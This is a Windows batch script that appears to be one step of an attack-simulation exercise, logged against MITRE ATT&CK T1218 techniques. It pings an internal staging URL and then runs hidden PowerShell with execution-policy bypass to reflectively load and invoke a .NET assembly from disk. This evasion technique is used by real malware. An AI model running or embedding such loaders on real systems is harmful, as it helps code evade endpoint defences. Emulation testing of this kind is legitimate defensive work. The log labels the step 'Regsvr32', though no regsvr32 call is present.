@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET yqwujj=DUMMY
SET rktyt=https://10.0.0.49
SET wgder=https://10.0.0.49/stage/2/icon.png?7564-10
SET bywux=ITZEL-S2B
SET evnktw=10
SET lmxfm=firelox.txt
SET gzqoyjl=7564

SET epfzzk=%APPDATA%\!evnktw!\macula-simulations.log
SET lbuaj=1
SET frqys=

curl -k -s -o nul "!wgder!" || (SET lbuaj=0 & SET frqys=heartbeat_failed)
for /f "tokens=1-4 delims=/ " %%a in ("%DATE%") do (
    SET zzxyyy=%%c
    SET ypfkmz=%%a
    SET mmrjnd=%%b
)
SET ypfkmz=0!ypfkmz!
SET mmrjnd=0!mmrjnd!
SET zzxyyy=!zzxyyy!!ypfkmz:~-2!!mmrjnd:~-2!
for /f "tokens=1-4 delims=:." %%a in ("%TIME%") do (
    SET tskf=0%%a
    SET bbrpe=0%%b
    SET kvxuy=0%%c
    SET ozwgg=00%%d
)
SET zzxyyy=!zzxyyy!!tskf:~-2!!bbrpe:~-2!!kvxuy:~-2!!ozwgg:~-3!
echo [!zzxyyy:~0,4]-[!zzxyyy:~4,2]-[!zzxyyy:~6,2] [!zzxyyy:~8,2]:[!zzxyyy:~10,2]:[!zzxyyy:~12,2].[!zzxyyy:~15,3!][!bywux!]: !evnktw!-!gzqoyjl!-T1218^|Signed Binary Proxy Execution=!lbuaj!^:!frqys!>>!epfzzk! 2>nul || ver > nul

cd /d "!yqwujj!" 2>nul
if !lbuaj! equ 1 (
    powershell.exe -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!lmxfm!')).EntryPoint.Invoke($null, @(,[string[]]@())) }" 2>&1 >nul || (SET lbuaj=0 & SET frqys=assembly_load_failed)
    for /f "tokens=1-4 delims=/ " %%a in ("%DATE%") do (
        SET zzxyyy=%%c
        SET ypfkmz=%%a
        SET mmrjnd=%%b
    )
    SET ypfkmz=0!ypfkmz!
    SET mmrjnd=0!mmrjnd!
    SET zzxyyy=!zzxyyy!!ypfkmz:~-2!!mmrjnd:~-2!
    for /f "tokens=1-4 delims=:." %%a in ("%TIME%") do (
        SET tskf=0%%a
        SET bbrpe=0%%b
        SET kvxuy=0%%c
        SET ozwgg=00%%d
    )
    SET zzxyyy=!zzxyyy!!tskf:~-2!!bbrpe:~-2!!kvxuy:~-2!!ozwgg:~-3!
    echo [!zzxyyy:~0,4]-[!zzxyyy:~4,2]-[!zzxyyy:~6,2] [!zzxyyy:~8,2]:[!zzxyyy:~10,2]:[!zzxyyy:~12,2].[!zzxyyy:~15,3!][!bywux!]: !evnktw!-!gzqoyjl!-T1218.010^|Regsvr32=!lbuaj!^:!frqys!>>!epfzzk! 2>nul || ver > nul
)